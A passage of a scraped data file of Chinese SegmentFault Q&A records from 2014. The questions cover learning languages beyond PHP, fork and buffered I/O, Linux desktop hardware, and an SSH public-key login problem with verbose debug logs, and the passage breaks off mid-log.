      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000596640\">\n<p>最烦这种类型的问题了，达到瓶颈就该换个语言学学？换个语言就能解决所有问题？</p>\n<p>吐槽暂且完毕，回归问题。你说你遇到了瓶颈，瓶颈在哪？或者说，你遇到了什么业务什么场景，php无法（很好）完成任务？我举个我自己的例子，我遇到的是一个数据抓取的场景，php虽然能完成这个功能，但从运行效率考虑无法很好地完成（尽管有诸如pthreads之类的工具），我了解了一下其他语言对于这个场景的情况，选择了node.js，很好地完成了任务。</p>\n<p>看了你的描述，我觉得你对于php的应用还局限在web端，那有没有尝试过拿php写一些别的东西？php-cli也还不错哦。我见过一个案例是有人拿php实现了一套支持c语言（子集）和php混写的语言的编译器（转为二进制代码）和解释器（←他是出于加密代码的目的写的），哦对了，那人当时高三升大一。突然觉得自己弱爆了。。。</p>\n<p>啰嗦了这么多，其实我想说的就两点，如果你的瓶颈是有具体的需求，而php无法支持（尽管我非常希望php能是万能的，但至少现在，这还只能是梦想），那么去选择能够很好的解决你需求的语言；如果你是学习到了一定程度，觉得已经孤独求败了，我想问，你对于php真的有你想象地那么熟悉吗？php是一个弱类型的语言，它是如何实现的？php的内存回收机制是怎样的？不要觉得这些是底层的东西，我是写上层代码的就不用去关心。如果能够了解的话，有时候能帮你解决一些非常非常非常隐蔽的坑。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000596530\">\n<p>我从python 的<code>tornado</code>框架中了解到web的真谛，可以试试 ^_^</p>\n<p>你了解了这么多，我想下一步应该是不断的解决各种味道的问题，从问题中吸取精华</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000598963\">\n<p>学习另外一门语言主要不是用来提升你的PHP能力的，选语言主要是为了解决不同场景与类型的问题，这也就是为什么会有这么多语言的原因，现在针对你的技能点，我谈下我的想法：<br>\n第一：PHP框架源码以及设计模式，你阅读各个框架的源码，那么首先你要明确，你是否真正理解其设计思想，与设计理念，你从中吸取了多少作者的思想？如果让你自己写一套框架，你可以真正上手了吗？不要认为，阅读了源码，看的懂代码，就以为明白了，这只是阅读的第一步；<br>\n第二：nosql,暂且说你都用过这些技术，那么你能很明确的清楚他们之间的最本质的区别吗？技术选型的时候，你能很明确的说出为什么要选这个，这个比起其他几个nosql来说，优势在哪里？再换个方向，你学过了memcache,那么分布式呢？分布式的情况下，memcache如果扩容呢？如何保证其伸缩性，和扩展性呢？<br>\n第三：环境搭建，优化，负载，mysql主从，那我且问你，你掌握了这些技能，都只是会用，根本谈不上根据场景的变化，做出相应的配置，比如给你1000万-1亿的PV网站，你来架构，你难道还是就一个主从套上去就好了吗？海量数据你又采用什么方式解决呢？<br>\n最后总结：非常理解楼主认为自己到达瓶颈的想法，上述写的只是想说，不管学习认识的技术，想想这个东西为什么要出来，他的诞生是用来解决什么问题的，最后再研究下他的原理，而不是很多技术，我学过用过就好了，这样没有深入的理解，是不会有多大效果的，最后建议楼主学习一下C语言，可以研究PHP源码，这样在写代码的时候也会考虑性能问题，同时通过C语言的学习，可以研究各种软件的源码和他们的原理，比如memcache,apache,nginx都可以去往源码方面研究，你会看到更多东西，学习JAVA会对你的框架设计思想以及设计模式方面有所提升</br></br></br></br></p>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000596526\">\n<h1>技能树</h1>\n<h2>php</h2>\n<ul>\n<li>框架<br><br><ul>\n<li>yii/yii2</li>\n<li>phalcon</li>\n<li>yaf</li>\n<li>thinkphp</li>\n<li>其他大大小小框架源码都读过很多</li>\n</ul>\n</br></br></li>\n<li>Composer</li>\n<li>Redis/Memcached/Mongdb</li>\n</ul>\n<h2>Linux</h2>\n<ul>\n<li>lnmp环境搭建、优化</li>\n<li>负载均衡</li>\n<li>mysql主从/redis主从</li>\n<li>服务器运维</li>\n</ul>\n<p>现在只是每天坚持看些linux方面的知识，感觉php学习达到了瓶颈，看一些优秀框架源码大致的设计模式也都清楚，所以现在基本就是看了个大概就没心思再跟代码跟下去了，感觉能提升的东西已经很有限了，急需学习一门新语言来拓展下眼界。</p>\n<p>眼下比较纠结是研究<strong>C or Java or Python</strong></p>\n</div>",
      "favourite": "25",
      "glance": "4.4k",
      "tags": [
        "php",
        "linux",
        "c",
        "java",
        "python"
      ],
      "time": "2014-07-05",
      "title": "从事php有一段时间了，感觉达到一定瓶颈，该学习哪种语言拓展下视野？",
      "url": "https://segmentfault.com/q/1010000000596526"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000603667\">\n<p>个人认为fork出来的东西是拷贝的，意思就是</p>\n<ul>\n<li>\n<strong>fd是文件描述符</strong>： 父进程的文件描述符等于子进程的文件描述符，关闭其中一个，另外一个值相等的也就关闭了。</li>\n<li>\n<strong>fp是文件流的指针</strong>： 父进程的fp指针\"等于\"子进程的fp指针，关闭其中一个指针，并没有销毁回收另外一个指针，他们的地址不同父进程**fp!=子进程**fp。</li>\n</ul>\n<p>表打我。。。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000597921\">\n<ol>\n<li>fork以后的语句子进程都会执行，所以在父进程关闭文件之前，已经把hello写入了。</li>\n<li>同样不明白= =。</li>\n</ol>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000605104\">\n<html><body>\n<ul>\n<li><p>首先要理解<code>fork</code>的一个特性： 父进程的所有打开文件描述符都会被复制到子进程中，父、子进程的每个相同的打开描述符共享一个文件表项。如下图（摘自APUE）所示。另外，在文件表中还有一项：<strong>打开文件引用计数</strong>，引用这个文件对象的描述符数（<code>dup</code>和<code>fork</code>都会增加这个计数，第一次<code>open</code>会使此计数为1，<code>close</code>会减小此计数，为0时销毁文件对象）。所以在程序的运行过程中，不管是父进程还是子进程先<code>close(fd)</code>或<code>fclose(fp)</code>,该文件表依然存在并没有被销毁，只有当文件表中的<strong>打开文件引用计数</strong>为0时才会销毁这个文件表对象。</p></li>\n<li><p><strong>题1</strong>中的I/O都是通过<strong>Linux系统调用</strong>来完成的,这些函数也常被称为<strong>不带缓冲的I/O(unbuffered I/O)</strong>。所以每一次调用都会立即写入文件中。而对于<strong>题2</strong>中的标准I/O库函数来说，都是带缓冲的，文件一般都是<strong>全缓冲</strong>，也就是说一定要把缓冲区填满才能进行实际的I/O操作。在执行语句<code>fprintf(fp, \"%s\", msg1);</code>时，由于没有填满缓冲区而实际的I/O操作并未完成。这时却调用了<code>fork</code>函数，这个函数同时也会把该缓冲区复制一份给子进程，这样在父、子进程中就各有一份<code>msg1</code>，当缓冲区填满后就会被刷新以进行实际的I/O操作（写入文件）。<a href=\"http://www.cplusplus.com/reference/cstdio/fflush/?kw=fflush\" rel=\"nofollow\"><code>int fflush ( FILE * stream );</code></a>函数能够提供手动进行刷新缓冲区，楼主可以试试在将<code>msg1</code>写入文件这条语句后面加上<code>fflush(fp);</code>则得出的结果将会和<strong>题1</strong>一样。</p></li>\n</ul>\n<p><img data-src=\"/image?src=http://img.my.csdn.net/uploads/201303/24/1364119383_7850.png&amp;objectId=1020000000605104&amp;token=1df6b7fd770e4480d4f90f37652ae1df\"/></p>\n</body></html>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000597201\">\n<html><body>\n<p><img data-src=\"http://segmentfault.com/img/bVcFwl\"/></p>\n<p><img data-src=\"http://segmentfault.com/img/bVcFwm\"/></p>\n<p>然后结果为：<br><img data-src=\"http://segmentfault.com/img/bVcFwo\"/></br></p>\n<p>==================================<br><strong>不太理解为何父进程已经把文件关了，而子进程依旧可以写入。<br>\n而且fork()创建的子进程不是应该执行fork之后的代码吗，为何题2又可以把第一句话写入</br></strong></br></p>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "1.4k",
      "tags": [
        "linux",
        "编程",
        "c"
      ],
      "time": "2014-07-06",
      "title": "《linux编程实践教程》中的两个习题， 有关fork的",
      "url": "https://segmentfault.com/q/1010000000597201"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000604726\">\n<p>题主，我买了一台 27 寸的苹果显示器，以及 一个 Raspberry Pi 运行 Debian 7，进行 Python Web 开发</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000604045\">\n<p>“GNU/Linux可以运行在更低配置的电脑上”和“GNU/Linux只要一般的配置就够了”是两回事。<br>\n量力而为尽可能选择一个配置好点的有几个好处：</br></p>\n<ul>\n<li>心情舒畅</li>\n<li>不容易卡</li>\n<li>节约时间也就是节约生命</li>\n</ul>\n<p>原来一直在用16G内存的电脑，现在用8G就卡得不行，目前<code>mate</code>桌面看起来算是省资源又用着舒服的桌面之一了。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000603927\">\n<p>你要用linux桌面建议别太差的配置，不然你也会感觉很难受。<br>\n就说gnome或者KDE，从X起来到桌面管理器，都是各种加载动态库啊什么的，特别是磁盘读写很频繁，除非你特意做了优化，比如通过自己编译或者用gentoo这样的发行版自己定制一些USE。</br></p>\n<p>所以如果你有SSD那是最好，这个SSD就可以把lib目录和SWAP加速了，当然内存大也好，内存大的话你可以划一部分内存出来当磁盘缓冲那样用，tmpfs</p>\n<p>或者这么说吧，你把chrome放在SSD上运行与放在普通机械硬盘上再允许的差距肯定是有的，就看你能不能忍了。</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000603897\">\n<p>我个人很想在Linux下开发，也不是为了折腾，纯粹是因为开发需要经常接触Linux环境。我的开发环境Linux也基本能够满足。</p>\n<p>但现在问题来了，很多人都说Linux不需要很高的配置，他们都拿自己快淘汰的机器去运行Linux，是不是Linux做桌面的时候就不需要高配置呢，或者说配置较高的电脑无法在Linux上体会到高配置带来的高体验？</p>\n<p>现在很多开发者的macbook都要求16G甚至更高的内存，SSD的硬盘。是不是Linux就不需要这些呢？有人说Linux没什么程序消耗资源，但实际情况是Linux下也有Chrome，也有Firefox，也有Intellij Idea，也有虚拟机要跑跑windows之类的。大家觉得把硬件的钱花在Linux上不值吗？</p>\n<p>我不想做纯理论的探讨，<strong>欢迎对这个问题有实际体验的同学来回答。</strong></p>\n</div>",
      "favourite": "2",
      "glance": "8.8k",
      "tags": [
        "linux"
      ],
      "time": "2014-07-14",
      "title": "是否有必要为Linux购买一台相对较高配置的电脑？",
      "url": "https://segmentfault.com/q/1010000000603897"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000605816\">\n<p>请问在LINUX下，如果快速拷贝多个文件夹 到另一个文件夹里</p>\n</div>",
      "favourite": "0",
      "glance": "2.7k",
      "tags": [
        "linux"
      ],
      "time": "2014-07-15",
      "title": "LINUX 拷贝多个文件夹 到 另一个文件夹里",
      "url": "https://segmentfault.com/q/1010000000605816"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000613576\">\n<p>说不定这个可以帮到你：<a href=\"http://www.cnblogs.com/qcly/archive/2013/07/27/3219535.html\" rel=\"nofollow\">一次由SELinux引起的ssh公钥认证失败问题</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000614177\">\n<p>看 debug 信息的倒数第7、8行：<br>\ndebug1: Trying private key: /root/.ssh/id_dsa<br>\ndebug3: no such identity: /root/.ssh/id_dsa</br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000614167\">\n<p>ssh -vvv name@host</p>\n<p>^^ 加上-vvv选项，然后把完整日志贴出来看看。</p>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000613569\">\n<p>生成的key应该是没有问题，因为我把生成的公钥写到到<code>/root/.ssh/authorized_keys</code>里面，然后执行<code>ssh root@xxx</code> 能够直接登陆。<br>\n但是换成普通用户则就出现了问题。<br>\n现在的情况：<br><code>/home/test/.ssh</code> 权限700<br><code>/home/test/.ssh/authorized_keys</code> 权限600<br>\n也执行了<code>chown -R test:test /home/test/.ssh</code></br></br></br></br></br></p>\n<p><code>/etc/ssh/sshd_config</code>里面也开启了登陆认证</p>\n<pre><code>RSAAuthentication yes\nPubkeyAuthentication yes\nAuthorizedKeysFile      .ssh/authorized_keys\n</code></pre>\n<p><code>service sshd restart</code> 也执行过了</p>\n<p><code>/etc/selinux/config</code>里面已经是<code>SELINUX=disabled</code><br>\n但是普通用户就是无法登录。<br>\n参看了安全日志/var/log/secure得到的结果也仅仅是一句：<br><code>Did not receive identification string from xxx</code></br></br></br></p>\n<p>加上登陆调试提示信息：</p>\n<pre><code>OpenSSH_5.3p1, OpenSSL 1.0.0-fips 29 Mar 2010\ndebug1: Reading configuration data /etc/ssh/ssh_config\ndebug1: Applying options for *\ndebug2: ssh_connect: needpriv 0\ndebug1: Connecting to 186.192.56.140 [186.192.56.140] port 22.\ndebug1: Connection established.\ndebug1: permanently_set_uid: 0/0\ndebug1: identity file /root/.ssh/identity type -1\ndebug3: Not a RSA1 key file /root/.ssh/id_rsa.\ndebug2: key_type_from_name: unknown key type '-----BEGIN'\ndebug3: key_read: missing keytype\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug2: key_type_from_name: unknown key type '-----END'\ndebug3: key_read: missing keytype\ndebug1: identity file /root/.ssh/id_rsa type 1\ndebug1: identity file /root/.ssh/id_dsa type -1\ndebug1: Remote protocol version 2.0, remote software version OpenSSH_5.3\ndebug1: match: OpenSSH_5.3 pat OpenSSH*\ndebug1: Enabling compatibility mode for protocol 2.0\ndebug1: Local version string SSH-2.0-OpenSSH_5.3\ndebug2: fd 3 setting O_NONBLOCK\ndebug1: SSH2_MSG_KEXINIT sent\ndebug3: Wrote 792 bytes for a total of 813\ndebug1: SSH2_MSG_KEXINIT received\ndebug2: kex_parse_kexinit: diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1\ndebug2: kex_parse_kexinit: ssh-rsa,ssh-dss\ndebug2: kex_parse_kexinit: aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se\ndebug2: kex_parse_kexinit: aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se\ndebug2: kex_parse_kexinit: hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96\ndebug2: kex_parse_kexinit: hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96\ndebug2: kex_parse_kexinit: none,zlib@openssh.com,zlib\ndebug2: kex_parse_kexinit: none,zlib@openssh.com,zlib\ndebug2: kex_parse_kexinit: \ndebug2: kex_parse_kexinit: \ndebug2: kex_parse_kexinit: first_kex_follows 0 \ndebug2: kex_parse_kexinit: reserved 0 \ndebug2: kex_parse_kexinit: diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1\ndebug2: kex_parse_kexinit: ssh-rsa\ndebug2: kex_parse_kexinit: aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se\ndebug2: kex_parse_kexinit: aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se\ndebug2: kex_parse_kexinit: hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96\ndebug2: kex_parse_kexinit: hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96\ndebug2: kex_parse_kexinit: none,zlib@openssh.com\ndebug2: kex_parse_kexinit: none,zlib@openssh.com\ndebug2: kex_parse_kexinit: \ndebug2: kex_parse_kexinit: \ndebug2: kex_parse_kexinit: first_kex_follows 0 \ndebug2: kex_parse_kexinit: reserved 0 \ndebug2: mac_setup: found hmac-md5\ndebug1: kex: server-&gt;client aes128-ctr hmac-md5 none\ndebug2: mac_setup: found hmac-md5\ndebug1: kex: client-&gt;server aes128-ctr hmac-md5 none\ndebug1: SSH2_MSG_KEX_DH_GEX_REQUEST(1024&lt;1024&lt;8192) sent\ndebug1: expecting SSH2_MSG_KEX_DH_GEX_GROUP\ndebug3: Wrote 24 bytes for a total of 837\ndebug2: dh_gen_key: priv key bits set: 126/256\ndebug2: bits set: 484/1024\ndebug1: SSH2_MSG_KEX_DH_GEX_INIT sent\ndebug1: expecting SSH2_MSG_KEX_DH_GEX_REPLY\ndebug3: Wrote 144 bytes for a total of 981\ndebug3: check_host_in_hostfile: filename /root/.ssh/known_hosts\ndebug3: check_host_in_hostfile: match line 2\ndebug1: Host '186.192.56.140' is known and matches the RSA host key.\ndebug1: Found key in /root/.ssh/known_hosts:2\ndebug2: bits set: 502/1024\ndebug1: ssh_rsa_verify: signature correct\ndebug2: kex_derive_keys\ndebug2: set_newkeys: mode 1\ndebug1: SSH2_MSG_NEWKEYS sent\ndebug1: expecting SSH2_MSG_NEWKEYS\ndebug3: Wrote 16 bytes for a total of 997\ndebug2: set_newkeys: mode 0\ndebug1: SSH2_MSG_NEWKEYS received\ndebug1: SSH2_MSG_SERVICE_REQUEST sent\ndebug3: Wrote 48 bytes for a total of 1045\ndebug2: service_accept: ssh-userauth\ndebug1: SSH2_MSG_SERVICE_ACCEPT received\ndebug2: key: /root/.ssh/identity ((nil))\ndebug2: key: /root/.ssh/id_rsa (0x7f04533f0bc0)\ndebug2: key: /root/.ssh/id_dsa ((nil))\ndebug3: Wrote 64 bytes for a total of 1109\ndebug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password\ndebug3: start over, passed a different list publickey,gssapi-keyex,gssapi-with-mic,password\ndebug3: preferred gssapi-keyex,gssapi-with-mic,publickey,keyboard-interactive,password\ndebug3: authmethod_lookup gssapi-keyex\ndebug3: remaining preferred: gssapi-with-mic,publickey,keyboard-interactive,password\ndebug3: authmethod_is_enabled gssapi-keyex\ndebug1: Next authentication method: gssapi-keyex\ndebug1: No valid Key exchange context\ndebug2: we did not send a packet, disable method\ndebug3: authmethod_lookup gssapi-with-mic\ndebug3: remaining preferred: publickey,keyboard-interactive,password\ndebug3: authmethod_is_enabled gssapi-with-mic\ndebug1: Next authentication method: gssapi-with-mic\ndebug3: Trying to reverse map address 186.192.56.140.\ndebug1: An invalid name was supplied\nCannot determine realm for numeric host address\n\ndebug1: An invalid name was supplied\nCannot determine realm for numeric host address\n\ndebug1: An invalid name was supplied\n\n\ndebug1: An invalid name was supplied\n\n\ndebug2: we did not send a packet, disable method\ndebug3: authmethod_lookup publickey\ndebug3: remaining preferred: keyboard-interactive,password\ndebug3: authmethod_is_enabled publickey\ndebug1: Next authentication method: publickey\ndebug1: Trying private key: /root/.ssh/identity\ndebug3: no such identity: /root/.ssh/identity\ndebug1: Offering public key: /root/.ssh/id_rsa\ndebug3: send_pubkey_test\ndebug2: we sent a publickey packet, wait for reply\ndebug3: Wrote 368 bytes for a total of 1477\ndebug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password\ndebug1: Trying private key: /root/.ssh/id_dsa\ndebug3: no such identity: /root/.ssh/id_dsa\ndebug2: we did not send a packet, disable method\ndebug3: authmethod_lookup password\ndebug3: remaining preferred: ,password\ndebug3: authmethod_is_enabled password\ndebug1: Next authentication method: password\ntest@186.192.56.140's password: \n</code></pre>\n<p><code>ssh root@192.168.56.140 -vvv</code></p>\n<pre><code>OpenSSH_5.3p1, OpenSSL 1.0.0-fips 29 Mar 2010\ndebug1: Reading configuration data /etc/ssh/ssh_config\ndebug1: Applying options for *\ndebug2: ssh_connect: needpriv 0\ndebug1: Connecting to 192.168.56.140 [192.168.56.140] port 22.\ndebug1: Connection established.\ndebug1: permanently_set_uid: 0/0\ndebug1: identity file /root/.ssh/identity type -1\ndebug3: Not a RSA1 key file /root/.ssh/id_rsa.\ndebug2: key_type_from_name: unknown key type '-----BEGIN'\ndebug3: key_read: missing keytype\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug3: key_read: missing whitespace\ndebug2: key_type_from_name: unknown key type '-----END'\ndebug3: key_read: missing keytype\ndebug1: identity file /root/.ssh/id_rsa type 1\ndebug1: identity file /root/.ssh/id_dsa type -1\ndebug1: Remote protocol version 2.0, remote software version OpenSSH_5.3\ndebug1: match: OpenSSH_5.3 pat OpenSSH*\ndebug1: Enabling compatibility mode for protocol 2.0\ndebug1: Local version string SSH-2.0-OpenSSH_5.3\ndebug2: fd 3 setting O_NONBLOCK\ndebug1: SSH2_MSG_KEXINIT sent\ndebug3: Wrote 792 bytes for a total of 813\ndebug1: SSH2_MSG_KEXINIT received\ndebug2: kex_parse_kexinit: diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1\ndebug2: kex_parse_kexinit: ssh-rsa,ssh-dss\ndebug2: kex_parse_kexinit: aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se\ndebug2: kex_parse_kexinit: aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se\ndebug2: kex_parse_kexinit: hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96\ndebug2: kex_parse_kexinit: hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96\ndebug2: kex_parse_kexinit: none,zlib@openssh.com,zlib\ndebug2: kex_parse_kexinit: none,zlib@openssh.com,zlib\ndebug2: kex_parse_kexinit: \ndebug2: kex_parse_kexinit: \ndebug2: kex_parse_kexinit: first_kex_follows 0 \ndebug2: kex_parse_kexinit: reserved 0 \ndebug2: kex_parse_kexinit: diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1\ndebug2: kex_parse_kexinit: ssh-rsa\ndebug2: kex_parse_kexinit: aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se\ndebug2: kex_parse_kexinit: aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se\ndebug2: kex_parse_kexinit: hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96\ndebug2: kex_parse_kexinit: hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96\ndebug2: kex_parse_kexinit: none,zlib@openssh.com\ndebug2: kex_parse_kexinit: none,zlib@openssh.com\ndebug2: kex_parse_kexinit: \ndebug2: kex_parse_kexinit: \ndebug2: kex_parse_kexinit: first_kex_follows 0 \ndebug2: kex_parse_kexinit: reserved 0 \ndebug2: mac_setup: found hmac-md5\ndebug1: kex: server-&gt;client aes128-ctr hmac-md5 none\ndebug2: mac_setup: found hmac-md5\ndebug1: kex: client-&gt;server aes128-ctr hmac-md5 none\ndebug1: SSH2_MSG_KEX_DH_GEX_REQUEST(1024&lt;1024&lt;8192) sent\ndebug1: expecting SSH2_MSG_KEX_DH_GEX_GROUP\ndebug3: Wrote 24 bytes for a total of 837\ndebug2: dh_gen_key: priv key bits set: 137/256\ndebug2: bits set: 519/1024\ndebug1: SSH2_MSG_KEX_DH_GEX_INIT sent\ndebug1: expecting SSH2_MSG_KEX_DH_GEX_REPLY\ndebug3: Wrote 144 bytes for a total of 981\ndebug3: check_host_in_hostfile: filename /root/.ssh/known_hosts\ndebug3: check_host_in_hostfile: match line 2\ndebug1: Host '192.168.56.140' is known and matches the RSA host key.\ndebug1: Found key in /root/.ssh/known_hosts:2\ndebug2: bits set: 517/1024\ndebug1: ssh_rsa_verify: signature correct\ndebug2: kex_derive_keys\ndebug2: set_newkeys: mode 1\ndebug1: SSH2_MSG_NEWKEYS sent\ndebug1: expecting SSH2_MSG_NEWKEYS\ndebug3: Wrote 16 bytes for a total of 997\ndebug2: set_newkeys: mode 0\ndebug1: SSH2_MSG_NEWKEYS received\ndebug1: SSH2_MSG_SERVICE_REQUEST sent\ndebug3: Wrote 48 bytes for a total of 1045\ndebug2: service_accept: ssh-userauth\ndebug1: SSH2_MSG_SERVICE_ACCEPT received\ndebug2: key: /root/.ssh/identity ((nil))\ndebug2: key: /root/.ssh/id_rsa (0x7faf8335ebb0)\ndebug2: key: /root/.ssh/id_dsa ((nil))\ndebug3: Wrote 64 bytes for a total of 1109\ndebug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password\ndebug3: start over, passed a different list publickey,gssapi-keyex,gssapi-with-mic,password\ndebug3: preferred gssapi-keyex,gssapi-with-mic,publickey,keyboard-interactive,password\ndebug3: authmethod_lookup gssapi-keyex\ndebug3: remaining preferred: gssapi-with-mic,publickey,keyboard-interactive,password\ndebug3: authmethod_is_enabled gssapi-keyex\ndebug1: Next authentication method: gssapi-keyex\ndebug1: No valid Key exchange context\ndebug2: we did not send a packet, disable method\ndebug3: authmethod_lookup gssapi-with-mic\ndebug3: remaining preferred: publickey,keyboard-interactive,password\ndebug3: authmethod_is_enabled gssapi-with-mic\ndebug1: Next authentication method: gssapi-with-mic\ndebug3: Trying to reverse map address 192.168.56.140.\ndebug1: An invalid name was supplied\nCannot determine realm for numeric host address\n\ndebug1: An invalid name was supplied\nCannot determine realm for numeric host address\n\ndebug1: An invalid name was supplied\n\n\ndebug1: An invalid name was supplied\n\n\ndebug2: we did not send a packet, disable method\ndebug3: authmethod_lookup publickey\ndebug3: remaining preferred: keyboard-interactive,password\ndebug3: authmethod_is_enabled publickey\ndebug1: Next authentication method: publickey\ndebug1: Trying private key: /root/.ssh/identity\ndebug3: no such identity: /root/.ssh/identity\ndebug1: Offering public key: /root/.ssh/id_rsa\ndebug3: send_pubkey_test\ndebug2: we sent a publickey packet, wait for reply\ndebug3: Wrote 368 bytes for a total of 1477\ndebug1: Server accepts key: pkalg ssh-rsa blen 277\ndebug2: input_userauth_pk_ok: SHA1 fp a8:19:63:d5:be:eb:7c:cd:c2:f9:b5:72:c9:84:dc:ec:e1:43:24:2d\ndebug3: sign_and_send_pubkey\ndebug1: read PEM private key done: type RSA\ndebug3: Wrote 640 bytes for a total of 2117\ndebug1: Authentication succeeded (publickey).\ndebug1: channel 0: new [client-session]\ndebug3: ssh_session2_open: channel_new: 0\ndebug2: channel 0: send open\ndebug1: Requesting no-more-sessions@openssh.com\ndebug1: Entering interactive session.\ndebug3: Wrote 128 bytes for a total of 2245\ndebug2: callback start\ndebug2: client_session2_setup: id 0\ndebug2: channel 0: request pty-req confirm 1\ndebug1: Sending environment.\ndebug3: Ignored env HOSTNAME\ndebug3: Ignored env TERM\ndebug3: Ignored env SHELL\ndebug3: Ignored env HISTSIZE\ndebug3: Ignored env SSH_CLIENT\ndebug3: Ignored env QTDIR\ndebug3: Ignored env QTINC\ndebug3: Ignored env SSH_TTY\ndebug3: Ignored env 